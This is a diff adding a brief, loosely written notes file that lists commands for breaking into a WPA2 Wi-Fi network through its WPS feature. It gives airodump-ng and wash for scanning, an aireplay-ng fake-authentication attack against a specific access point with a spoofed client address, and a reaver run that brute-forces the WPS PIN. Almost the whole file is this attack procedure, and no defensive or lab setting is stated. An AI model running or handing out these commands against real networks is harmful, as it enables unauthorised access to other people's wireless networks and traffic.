@@ -1,0 +1,19 @@
+first we are going to check all the newtwork 
+
+-> airodump-ng wlan0
+
+Second we need to check all the wifi with wpa2 power
+
+-> wash --interface wlan0
+
+
+third we need do a fake authentication attack 
+
+-> aireplay-ng --fakeauth 30 -a 50:2B:73:9E:10:08 -h A6:DB:BE:50:04:8E wlan0
+
+
+
+third a split program show
+
+-> reaver --bssid 50:2B:73:9E:10:08 --channel 7 --interface wlan0 -vvv --no-associate
+
